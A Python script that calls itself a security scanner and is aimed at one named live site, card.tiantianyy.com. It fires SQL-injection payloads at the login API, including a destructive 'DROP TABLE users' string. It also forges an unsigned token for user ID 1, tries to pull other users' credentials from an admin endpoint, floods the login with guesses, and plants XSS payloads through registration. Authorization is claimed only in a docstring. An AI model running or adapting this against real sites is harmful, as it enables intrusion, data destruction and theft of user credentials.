#!/usr/bin/env python3
"""
Security Assessment Script for Web Application
Target: card.tiantianyy.com
For Authorized Security Testing Only
"""

import requests
import json
import base64
import time
import re
from urllib.parse import urljoin

BASE_URL = "https://card.tiantianyy.com/api"

class SecurityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.findings = []
        self.token = None
    
    def add_finding(self, category, severity, title, description, evidence=None):
        finding = {
            "category": category,
            "severity": severity,
            "title": title,
            "description": description,
            "evidence": evidence
        }
        self.findings.append(finding)
        print(f"\n[{severity}] {title}")
        print(f"    Category: {category}")
        print(f"    {description}")
        if evidence:
            print(f"    Evidence: {evidence[:200]}...")
    
    def api_request(self, endpoint, data=None, token=None, method="POST"):
        url = f"{BASE_URL}/{endpoint}"
        headers = self.session.headers.copy()
        if token:
            headers["Authorization"] = f"Bearer {token}"
        
        try:
            if method == "POST":
                response = self.session.post(url, json=data or {}, headers=headers, timeout=10)
            else:
                response = self.session.get(url, params=data, headers=headers, timeout=10)
            return response.json()
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def test_sqli(self):
        print("\n" + "="*60)
        print("[*] Testing for SQL Injection")
        print("="*60)
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "\" OR \"1\"=\"1",
            "1' OR '1'='1",
            "admin'--",
            "admin' #",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
        ]
        
        for payload in sqli_payloads:
            result = self.api_request("user.php?action=login", {
                "username": payload,
                "password": "test"
            })
            
            if result.get("success"):
                self.add_finding(
                    "Injection",
                    "CRITICAL",
                    "SQL Injection in Login",
                    f"SQL injection vulnerability detected with payload: {payload}",
                    json.dumps(result)
                )
                return
            
            msg = result.get("message", "")
            if "sql" in msg.lower() or "syntax" in msg.lower() or "database" in msg.lower():
                self.add_finding(
                    "Injection",
                    "HIGH",
                    "Potential SQL Injection",
                    f"Database error message exposed with payload: {payload}",
                    msg
                )
        
        print("    [-] No SQL injection vulnerabilities detected")
    
    def test_token_security(self):
        print("\n" + "="*60)
        print("[*] Testing Token Security")
        print("="*60)
        
        if not self.token:
            print("    [-] No token available for testing")
            return
        
        parts = self.token.split(".")
        if len(parts) == 2:
            try:
                payload_b64 = parts[0]
                payload_b64 += "=" * (4 - len(payload_b64) % 4)
                payload = base64.b64decode(payload_b64).decode()
                print(f"    Token payload: {payload}")
                
                payload_data = json.loads(payload)
                if "user_id" in payload_data:
                    fake_token = base64.b64encode(json.dumps({
                        "user_id": 1,
                        "exp": 9999999999
                    }).encode()).decode() + "." + parts[1]
                    
                    result = self.api_request("user.php?action=getInfo", token=fake_token)
                    
                    if result.get("success"):
                        self.add_finding(
                            "Authentication",
                            "CRITICAL",
                            "Token Signature Bypass",
                            "Token signature verification is not properly implemented",
                            json.dumps(result)
                        )
                    else:
                        print("    [+] Token signature verification working")
            except Exception as e:
                print(f"    [-] Error parsing token: {e}")
        
        if "exp" not in payload:
            self.add_finding(
                "Authentication",
                "MEDIUM",
                "Token Missing Expiration",
                "JWT token does not contain expiration claim",
                payload
            )
    
    def test_idor(self):
        print("\n" + "="*60)
        print("[*] Testing for IDOR Vulnerabilities")
        print("="*60)
        
        if not self.token:
            print("    [-] No token available for testing")
            return
        
        result = self.api_request("user.php?action=getInviteList", {
            "page": 1,
            "page_size": 100
        }, self.token)
        
        print(f"    Invite list result: {result.get('success')}")
        
        for user_id in [1, 2, 3, 999]:
            result = self.api_request("admin.php?action=getUserCredentials", {
                "user_id": user_id
            }, self.token)
            
            if result.get("success"):
                self.add_finding(
                    "Access Control",
                    "HIGH",
                    "IDOR in User Credentials",
                    f"Can access other user's credentials without authorization",
                    json.dumps(result)
                )
    
    def test_rate_limiting(self):
        print("\n" + "="*60)
        print("[*] Testing Rate Limiting")
        print("="*60)
        
        attempts = 0
        blocked = False
        
        for i in range(15):
            result = self.api_request("user.php?action=login", {
                "username": "admin",
                "password": f"wrongpass{i}"
            })
            attempts += 1
            
            if "blocked" in result.get("message", "").lower() or \
               "too many" in result.get("message", "").lower() or \
               "rate limit" in result.get("message", "").lower():
                blocked = True
                print(f"    [+] Rate limiting detected after {attempts} attempts")
                break
            
            time.sleep(0.1)
        
        if not blocked:
            self.add_finding(
                "Rate Limiting",
                "MEDIUM",
                "No Rate Limiting on Login",
                f"Made {attempts} login attempts without being blocked",
                None
            )
    
    def test_info_disclosure(self):
        print("\n" + "="*60)
        print("[*] Testing for Information Disclosure")
        print("="*60)
        
        endpoints = [
            ("user.php?action=getConfig", {"key": "site_name"}),
            ("user.php?action=getConfig", {"key": "admin_email"}),
            ("user.php?action=getConfig", {"key": "database"}),
            ("admin.php?action=getStats", {}),
            ("key.php?action=getStock", {}),
        ]
        
        for endpoint, data in endpoints:
            result = self.api_request(endpoint, data, self.token)
            
            if result.get("success") and result.get("data"):
                print(f"    [+] Endpoint accessible: {endpoint}")
    
    def test_auth_bypass(self):
        print("\n" + "="*60)
        print("[*] Testing Authentication Bypass")
        print("="*60)
        
        protected_endpoints = [
            ("user.php?action=getInfo", {}),
            ("key.php?action=myKeys", {}),
            ("order.php?action=rechargeList", {}),
        ]
        
        for endpoint, data in protected_endpoints:
            result = self.api_request(endpoint, data)
            
            if result.get("success"):
                self.add_finding(
                    "Authentication",
                    "HIGH",
                    "Unauthenticated Access",
                    f"Protected endpoint accessible without authentication: {endpoint}",
                    json.dumps(result)[:200]
                )
            else:
                print(f"    [+] Endpoint properly protected: {endpoint}")
    
    def test_xss(self):
        print("\n" + "="*60)
        print("[*] Testing for XSS Vulnerabilities")
        print("="*60)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
        ]
        
        for payload in xss_payloads:
            result = self.api_request("user.php?action=register", {
                "username": payload[:20],
                "password": "Test@123456",
                "device_id": "test_xss"
            })
            
            if result.get("success"):
                print(f"    [!] XSS payload registered: {payload[:20]}")
    
    def test_input_validation(self):
        print("\n" + "="*60)
        print("[*] Testing Input Validation")
        print("="*60)
        
        test_cases = [
            ("user.php?action=register", {
                "username": "a" * 1000,
                "password": "test",
                "device_id": "test"
            }, "Long username"),
            ("user.php?action=register", {
                "username": "",
                "password": "test",
                "device_id": "test"
            }, "Empty username"),
            ("user.php?action=register", {
                "username": "test",
                "password": "",
                "device_id": "test"
            }, "Empty password"),
            ("key.php?action=buy", {
                "category_id": -1,
                "quantity": 1
            }, "Negative category ID"),
            ("key.php?action=buy", {
                "category_id": 1,
                "quantity": -1
            }, "Negative quantity"),
        ]
        
        for endpoint, data, desc in test_cases:
            result = self.api_request(endpoint, data, self.token)
            print(f"    {desc}: {result.get('message', 'No message')}")
    
    def register_test_user(self):
        print("\n" + "="*60)
        print("[*] Registering Test User")
        print("="*60)
        
        import random
        import string
        username = "audit_" + ''.join(random.choices(string.ascii_lowercase, k=8))
        
        result = self.api_request("user.php?action=register", {
            "username": username,
            "password": "Test@123456",
            "invite_code": "",
            "device_id": "audit_device_" + username
        })
        
        if result.get("success"):
            self.token = result.get("data", {}).get("token")
            print(f"    [+] Registered: {username}")
            print(f"    [+] Token obtained: {self.token[:50]}...")
            return True
        else:
            print(f"    [-] Registration failed: {result.get('message')}")
            return False
    
    def run_all_tests(self):
        print("="*60)
        print("Security Assessment Scanner")
        print("Target: card.tiantianyy.com")
        print("="*60)
        
        self.register_test_user()
        
        self.test_sqli()
        self.test_auth_bypass()
        self.test_token_security()
        self.test_idor()
        self.test_rate_limiting()
        self.test_info_disclosure()
        self.test_xss()
        self.test_input_validation()
        
        print("\n" + "="*60)
        print("SCAN COMPLETE - SUMMARY")
        print("="*60)
        
        if self.findings:
            print(f"\n[!] Found {len(self.findings)} security findings:\n")
            for i, finding in enumerate(self.findings, 1):
                print(f"{i}. [{finding['severity']}] {finding['title']}")
                print(f"   Category: {finding['category']}")
                print(f"   {finding['description']}\n")
        else:
            print("\n[+] No critical security findings detected")
        
        return self.findings

if __name__ == "__main__":
    scanner = SecurityScanner()
    findings = scanner.run_all_tests()
